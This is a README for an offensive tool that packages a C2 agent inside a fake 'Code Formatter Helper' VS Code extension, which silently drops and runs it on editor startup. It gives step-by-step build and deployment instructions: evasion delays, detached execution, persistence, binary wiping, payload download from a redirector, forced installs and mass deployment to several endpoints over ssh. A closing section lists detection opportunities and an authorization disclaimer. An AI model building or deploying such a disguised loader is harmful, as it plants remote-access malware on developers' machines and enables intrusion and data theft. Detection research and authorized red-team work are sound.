# VS Code Extension Payload Loader

A VS Code extension template that deploys and executes a payload binary when the extension activates. Designed for **red team operations** and **purple team detection validation** — the extension masquerades as a legitimate "Code Formatter Helper" while silently delivering a C2 agent (Mythic Poseidon, Sliver, Havoc, etc.) to the target host.

---

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [What Happens After Installation](#what-happens-after-installation)
- [C2 Connection Flow](#c2-connection-flow)
- [Supported VS Code Forks](#supported-vs-code-forks)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [Building the Payload](#building-the-payload)
- [Installing the Extension](#installing-the-extension)
- [Verifying the Beacon](#verifying-the-beacon)
- [Detection Considerations](#detection-considerations)
- [File Structure](#file-structure)
- [Disclaimer](#disclaimer)

---

## Overview

This project packages a C2 payload binary inside a VS Code extension (`.vsix`). When a user installs the extension in VS Code (or any VS Code-compatible editor), the payload is silently extracted, dropped to a cache directory, and executed in a detached process. The payload then beacons back to your C2 infrastructure.

The extension presents a legitimate-looking identity ("Code Formatter Helper") with real commands, a format-on-save provider, configuration settings, and an icon — making it indistinguishable from a normal productivity extension.

### Key Features

| Feature | Description |
|---------|-------------|
| **Cover identity** | Masquerades as a code formatter with working commands |
| **Embedded or download** | Bundle the payload in the .vsix, or fetch it at runtime |
| **Cross-platform** | macOS, Linux, and Windows support |
| **Delayed execution** | Configurable delay + random jitter to avoid startup detection |
| **Detached process** | Payload survives VS Code exit (`nohup` on Unix, detached spawn on Windows) |
| **Soft persistence** | Enables VS Code auto-update settings to keep the extension installed |
| **Cleanup** | Overwrites and deletes the dropped binary after execution |
| **No hardcoded values** | All C2 details are read from `config.json` at runtime — nothing is baked into the code |
| **No dependencies** | Zero npm runtime dependencies; uses only Node.js built-ins |

---

## How It Works

```
┌─────────────────────────────────────────────────────────────┐
│  1. Build Phase (attacker machine)                          │
│                                                             │
│  payload binary ──► build_extension.sh ──► .vsix file      │
│  (Poseidon,           (embeds binary       (installable     │
│   Sliver, etc.)        into extension)      VS Code package) │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  2. Delivery Phase (target machine)                         │
│                                                             │
│  .vsix file ──► code --install-extension ──► VS Code        │
│                  (or GUI install)              loads ext     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  3. Activation Phase (on VS Code startup)                   │
│                                                             │
│  VS Code starts ──► extension activates ──► reads config    │
│                     (onStartupFinished)      (delay + jitter)│
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  4. Deployment Phase (silent, after delay)                  │
│                                                             │
│  Extract payload ──► Drop to cache dir ──► chmod +x        │
│  from extension/     (blends in with         (Unix only)     │
│  payload/agent       VS Code data)                          │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  5. Execution Phase                                         │
│                                                             │
│  nohup payload & ──► detached process ──► payload runs      │
│  (Unix)              (survives VS Code      independently    │
│                       exit)                                  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  6. Beacon Phase                                            │
│                                                             │
│  Payload beacons ──► Redirector ──► C2 Team Server          │
│  to C2 (HTTP/S)     (forwards)     (operator interacts)     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  7. Cleanup Phase (30s after execution)                     │
│                                                             │
│  Dropped binary ──► overwritten with zeros ──► deleted      │
│  (fileless after execution)                                 │
└─────────────────────────────────────────────────────────────┘
```

---

## What Happens After Installation

Once the `.vsix` is installed in VS Code:

1. **Extension registers** — VS Code loads the extension on startup (`onStartupFinished` activation event). The extension appears in the Extensions sidebar as "Code Formatter Helper" with a formatter icon.

2. **Decoy commands activate** — Three commands are registered (`Format Document`, `Format Selection`, `Toggle Auto-Format on Save`) along with a no-op format-on-save provider. These make the extension look and behave like a real formatter.

3. **Config is loaded** — The extension reads `config.json` (if present) for deployment settings: method, delay, jitter, payload name, cleanup options. If no config is found, defaults are used.

4. **Payload is deployed** (after `delayMs + jitter`):
   - **Embedded mode**: The binary bundled at `extension/payload/agent` is copied to the OS-specific cache directory.
   - **Download mode**: The binary is fetched from the URL specified in config via `curl` (Unix) or `Invoke-WebRequest` (Windows).

5. **Payload executes** — The binary is made executable (`chmod +x` on Unix) and launched via `nohup` (Unix) or detached `spawn` (Windows). The process is fully detached from VS Code — it survives if VS Code is closed.

6. **Beacon established** — The payload (e.g., Poseidon agent) initiates its C2 protocol — typically HTTP(S) beacons to a redirector, which forwards traffic to the C2 team server. A new callback appears in the operator's C2 console.

7. **Cleanup runs** (30s later, configurable) — The dropped binary is overwritten with zeros (first 4 KB) and deleted from disk. The payload process continues running in memory.

8. **Persistence applied** — VS Code settings are modified to enable `extensions.autoUpdate` and `extensions.autoCheckUpdates`, ensuring the extension (and future updates) remain installed.

---

## C2 Connection Flow

```
Target Machine                    Attacker Infrastructure
┌──────────────┐                  ┌──────────────┐         ┌──────────────┐
│              │                  │              │         │              │
│  VS Code     │                  │  Redirector  │         │  C2 Team     │
│  Extension   │                  │  (HTTPS)     │         │  Server      │
│              │   HTTP(S)        │              │  HTTP(S)│              │
│  Payload ────┼─────────────────►│  forwards ───┼────────►│  Mythic /    │
│  (Poseidon/  │   beacon         │  all C2      │  proxied│  Sliver /    │
│   Sliver/    │   traffic        │  traffic     │  traffic│  Havoc       │
│   Havoc)     │                  │              │         │              │
│              │◄─────────────────│              │◄────────│              │
│              │   tasking        │              │  tasks  │              │
└──────────────┘                  └──────────────┘         └──────────────┘
       │                                                          │
       │                                                          │
       │  Payload runs as                                         │  Operator
       │  detached process                                        │  interacts via
       │  (nohup)                                                 │  C2 UI / API
       │                                                          │
       │  Drop location:                                          │  New callback
       │  macOS: ~/Library/Application Support/Code/User/cache/   │  appears with
       │  Linux: ~/.cache/vscode/                                 │  host, user, IP
       │  Windows: %TEMP%\vscode-cache\                           │
```

### Why a Redirector?

The redirector sits between the payload and the C2 team server. This provides:
- **Infrastructure protection** — The real C2 server IP is never exposed to the target
- **Flexibility** — You can swap C2 servers without rebuilding payloads
- **Resilience** — If the redirector is burned, you stand up a new one and update DNS
- **OPSEC** — The redirector can filter traffic, serve legitimate-looking responses, and log

### C2 Framework Compatibility

This loader is agnostic — it just drops and executes a binary. Any C2 framework that produces a standalone binary works:

| C2 Framework | Payload Type | Notes |
|--------------|-------------|-------|
| **Mythic (Poseidon)** | Go binary | Tested. Build via Mythic UI or API with HTTP C2 profile. |
| **Sliver** | Go binary | Build via `sliver > generate` |
| **Havoc** | C/C++ implant | Build via Havoc UI |
| **Covenant** | .NET binary | Build via Covenant UI |
| **Cobalt Strike** | Beacon artifact | Build via Artifact Kit |
| **Custom** | Any executable | As long as it's a standalone binary |

---

## Supported VS Code Forks

The extension uses the standard VS Code extension API and can be installed in any editor that supports `.vsix` packages:

| Editor | Install Command | Notes |
|--------|----------------|-------|
| **VS Code** | `code --install-extension file.vsix --force` | Standard |
| **Cursor** | `cursor --install-extension file.vsix --force` | VS Code fork |
| **Code-OSS** | `code-oss --install-extension file.vsix --force` | Open-source VS Code build |
| **VSCodium** | `codium --install-extension file.vsix --force` | Open-source VS Code |
| **Windsurf** | `windsurf --install-extension file.vsix --force` | VS Code fork |
| **Theia** | Browser-based — install via Extensions sidebar | IDE framework |
| **Code-OSS** | `code-oss --install-extension file.vsix --force` | Open-source build |

### Manual Installation (for editors without CLI)

If the editor doesn't have a `--install-extension` command, you can install manually:

```bash
# 1. Extract the .vsix (it's a zip)
unzip code-formatter-helper-1.2.4.vsix -d /tmp/vsix-extract

# 2. Copy the extension/ contents to the extensions directory
#    (path varies by editor — see below)
cp -r /tmp/vsix-extract/extension ~/.vscode/extensions/devtools-community.code-formatter-helper-1.2.4/

# 3. Register in extensions.json (if the editor uses one)
#    Edit ~/.vscode/extensions/extensions.json and add an entry
```

Extension directories by editor:

| Editor | Extensions Directory |
|--------|---------------------|
| VS Code (macOS) | `~/Library/Application Support/Code/User/extensions/` or `~/.vscode/extensions/` |
| VS Code (Linux) | `~/.vscode/extensions/` |
| VS Code (Windows) | `%USERPROFILE%\.vscode\extensions\` |
| Cursor | `~/.cursor/extensions/` |
| VSCodium | `~/.vscode-oss/extensions/` |
| Windsurf | `~/.windsurf/extensions/` |

---

## Prerequisites

### On the build machine:
- **Node.js 18+** and **npm** (for `vsce` packaging)
- **A compiled C2 payload binary** (from your C2 framework)
- **`npx`** (ships with npm — no global installs needed)

### On the target machine:
- **VS Code** (or any compatible fork: Cursor, VSCodium, Windsurf, etc.)
- **Network access** to your C2 redirector (HTTPS 443 or your configured port)

### C2 infrastructure:
- **C2 team server** (Mythic, Sliver, Havoc, etc.) running and accessible
- **Redirector** (nginx, Apache, or cloud proxy) forwarding C2 traffic to the team server
- **Payload binary** compiled with the redirector's hostname/IP as the callback address

---

## Quick Start

```bash
# 1. Clone this repo
git clone git@github.com:sam00/VS-Code-extension-payload-loader.git
cd VS-Code-extension-payload-loader

# 2. Create your config
cp config.example.json config.json
# Edit config.json — see Configuration section below

# 3. Build the .vsix with your payload
PAYLOAD_SOURCE=/path/to/your/compiled/agent bash build_extension.sh

# 4. Install on target
code --install-extension code-formatter-helper-1.2.4.vsix --force

# 5. Verify beacon in your C2 console
```

---

## Configuration

The extension reads `config.json` at activation time. This file is **gitignored** and never committed.

### Setup

```bash
cp config.example.json config.json
```

### Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `method` | string | `"embedded"` | `"embedded"` — binary bundled in .vsix; `"download"` — fetch at runtime |
| `url` | string | `""` | URL to download payload from (only if `method = "download"`) |
| `payloadName` | string | `"com.vscode.helper"` | Filename for the dropped payload |
| `delayMs` | number | `5000` | Delay before payload execution (ms) |
| `jitterMs` | number | `3000` | Random jitter added to delay (ms) |
| `persist` | boolean | `true` | Enable VS Code auto-update settings for persistence |
| `cleanup` | boolean | `true` | Delete dropped binary after execution |
| `cleanupDelayMs` | number | `30000` | Delay before cleanup (ms) |

### Example: Embedded (recommended)

```json
{
  "method": "embedded",
  "payloadName": "com.vscode.helper",
  "delayMs": 5000,
  "jitterMs": 3000,
  "persist": true,
  "cleanup": true,
  "cleanupDelayMs": 30000
}
```

### Example: Download (payload hosted externally)

```json
{
  "method": "download",
  "url": "https://your-redirector.example.com/assets/update.bin",
  "payloadName": "com.vscode.helper",
  "delayMs": 5000,
  "jitterMs": 3000,
  "persist": true,
  "cleanup": true,
  "cleanupDelayMs": 30000
}
```

> **Note**: The C2 callback IP/hostname is compiled into the payload binary itself (by your C2 framework). The `config.json` only controls how the extension deploys the binary — not where the payload beacons to.

---

## Building the Payload

### Step 1: Compile your C2 payload

Build the payload binary in your C2 framework. The binary must be configured to beacon to your **redirector** (not the team server directly).

#### Mythic (Poseidon)

1. Open Mythic UI
2. Go to **Payloads → Create Payload**
3. Select agent: `poseidon`
4. Select C2 profile: `http`
5. Set `callback_host` to your redirector URL (e.g., `https://your-redirector.example.com`)
6. Set `callback_port` to `443`
7. Build and download the binary

#### Sliver

```bash
sliver > generate --http your-redirector.example.com:443 --os darwin --arch amd64
```

#### Havoc

1. Open Havoc UI
2. **Payloads → Create Payload**
3. Configure HTTP listener pointing to your redirector
4. Build and download

### Step 2: Build the .vsix

```bash
cd VS-Code-extension-payload-loader

# Option A: Use env var to specify payload
PAYLOAD_SOURCE=/path/to/your/agent bash build_extension.sh

# Option B: Place payload manually
mkdir -p payload
cp /path/to/your/agent payload/agent
bash build_extension.sh
```

The build script will:
1. Copy your payload binary to `payload/agent`
2. Run `vsce package` via npx
3. Produce `code-formatter-helper-1.2.4.vsix`

### Step 3: (Optional) Bundle config.json into the .vsix

By default, `config.json` is excluded from the .vsix (via `.vscodeignore`). If you want to bundle it:

```bash
# Remove config.json from .vscodeignore
sed -i '' '/config.json/d' .vscodeignore

# Create your config.json
cp config.example.json config.json
# Edit with your values

# Rebuild
bash build_extension.sh
```

If `config.json` is not bundled, the extension uses defaults (embedded mode, 5s delay, cleanup enabled).

---

## Installing the Extension

### Method 1: CLI (fastest)

```bash
# VS Code
code --install-extension code-formatter-helper-1.2.4.vsix --force

# Cursor
cursor --install-extension code-formatter-helper-1.2.4.vsix --force

# VSCodium
codium --install-extension code-formatter-helper-1.2.4.vsix --force

# Windsurf
windsurf --install-extension code-formatter-helper-1.2.4.vsix --force
```

The `--force` flag bypasses signature verification.

### Method 2: VS Code GUI

1. Open VS Code
2. Press `Ctrl+Shift+X` (Windows/Linux) or `Cmd+Shift+X` (macOS) to open Extensions
3. Click the `...` menu (top-right of Extensions sidebar)
4. Select **"Install from VSIX..."**
5. Navigate to and select the `.vsix` file
6. Reload VS Code when prompted

### Method 3: Remote via SSH

```bash
# Copy the .vsix to the target
scp code-formatter-helper-1.2.4.vsix user@target:/tmp/

# Install remotely
ssh user@target 'code --install-extension /tmp/code-formatter-helper-1.2.4.vsix --force'
```

### Method 4: Manual extraction (for editors without CLI)

```bash
# Extract the .vsix (it's a standard zip)
unzip code-formatter-helper-1.2.4.vsix -d /tmp/vsix-extract

# Copy to the editor's extensions directory
mkdir -p ~/.vscode/extensions/devtools-community.code-formatter-helper-1.2.4
cp -r /tmp/vsix-extract/extension/* ~/.vscode/extensions/devtools-community.code-formatter-helper-1.2.4/

# Restart the editor
```

### Method 5: Deploy across multiple endpoints

```bash
for host in endpoint-01 endpoint-02 endpoint-03; do
    echo "=== Deploying to $host ==="
    scp code-formatter-helper-1.2.4.vsix "$host:/tmp/"
    ssh "$host" 'code --install-extension /tmp/code-formatter-helper-1.2.4.vsix --force'
done
```

---

## Verifying the Beacon

After installation, the payload will beacon within 5-8 seconds (default delay + jitter).

### Check the payload process

```bash
# macOS / Linux
ps aux | grep com.vscode.helper

# Check the drop location
ls -la ~/Library/Application\ Support/Code/User/cache/   # macOS
ls -la ~/.cache/vscode/                                    # Linux
```

### Check your C2 console

#### Mythic
1. Open Mythic UI (e.g., `https://<your-team-server>:<port>`)
2. Go to **Active Callbacks**
3. Look for a new callback from the target host
4. Click **Interact** to open a session

#### Sliver
```bash
sliver > sessions
# Look for a new session from the target
sliver > use <session-id>
```

#### Havoc
1. Open Havoc UI
2. Check **Sessions** tab
3. New session should appear from the target

### Troubleshooting

| Issue | Check |
|-------|-------|
| No callback in C2 | Verify redirector is running and forwarding to team server |
| No callback in C2 | Verify payload binary was compiled with correct redirector URL |
| Extension not activating | Restart VS Code; check `~/.vscode/extensions/` for the extension |
| Payload process not running | Check `ps aux` for the process; check drop directory for the binary |
| Payload exits immediately | Verify the binary is compiled for the target OS/arch |
| `code` command not found | Use manual extraction method (Method 4 above) |

---

## Detection Considerations

This tool is designed for **authorized red team engagements** and **purple team detection validation**. Defenders should be aware of the following detection opportunities:

### Endpoint Detection (EDR / AV)

| Behavior | MITRE ATT&CK | Detection Opportunity |
|----------|-------------|----------------------|
| Extension writes binary to cache dir | T1105 (Ingress Tool Transfer) | Monitor VS Code extension directories for binary file creation |
| `nohup` execution of non-VS Code binary | T1059 (Command Execution) | Process tree: VS Code → nohup → unknown binary |
| Modification of VS Code settings.json | T1543 (Persistence) | Monitor for changes to `extensions.autoUpdate` |
| Binary executed from cache directory | T1027 (Obfuscated Files) | Alert on executable files in VS Code cache paths |
| Extension with `onStartupFinished` + file operations | T1547 (Boot/Logon Autostart) | Correlate extension activation with file system writes |

### Network Detection

| Behavior | Detection Opportunity |
|----------|----------------------|
| HTTP(S) beaconing from VS Code process | Correlate network connections from `Code` or `node` processes |
| Regular interval callbacks | Detect periodic beacon patterns (default: 2s interval) |
| Traffic to unknown domains | Threat intel correlation on redirector domains/IPs |

### Recommended SentinelOne / EDR Policies

- Enable ** tamper protection** (blocks process killing attempts)
- Enable **behavioral AI** (detects anomalous process trees)
- Monitor **VS Code extension directories** for binary drops
- Alert on **`nohup`** spawned by GUI applications
- Alert on **settings.json modifications** by non-user processes

---

## File Structure

```
VS-Code-extension-payload-loader/
├── .gitignore                 # Excludes payload binaries, config.json, .vsix
├── .vscodeignore              # Excludes dev files from the .vsix package
├── CHANGELOG.md               # Extension changelog (cover identity)
├── LICENSE                    # MIT license
├── README.md                  # This file
├── build.js                   # Pre-publish script (copies payload binary)
├── build_extension.sh         # Build script (packages .vsix via vsce)
├── config.example.json        # Template config with documented options
├── extension.js               # Main extension code (payload loader)
├── media/
│   └── icon.png               # Extension icon (128x128)
├── docs/
│   ├── BUILD_AND_DEPLOY.md    # Detailed build and deployment guide
│   └── PAYLOAD_SETUP.md       # Configuration reference
└── payload/
    └── README.md              # Instructions for placing the payload binary
```

### What's NOT in this repository

- **No payload binaries** — you supply your own compiled C2 agent
- **No IP addresses** — all C2 details are in your local `config.json` (gitignored)
- **No hostnames** — no target or infrastructure hostnames anywhere
- **No credentials** — no passwords, API keys, or secrets
- **No target-specific data** — no machine names, usernames, or domain info
- **No built .vsix files** — excluded via .gitignore

---

## Disclaimer

This tool is provided for **authorized security testing only**. You must have explicit written permission to test any system before using this tool. Unauthorized use of this tool against systems you do not own or have permission to test is illegal.

### Authorized Use Cases

- Red team engagements with documented scope and authorization
- Purple team exercises for detection validation
- Security research in isolated lab environments
- Training and certification practice (OSCP, CRTO, etc.)

### Responsibilities

- **You** are responsible for ensuring you have authorization
- **You** are responsible for configuring the payload to beacon to your own infrastructure
- **You** are responsible for complying with all applicable laws and regulations
- The authors and contributors are not responsible for misuse of this tool

---

## License

MIT — see [LICENSE](LICENSE)
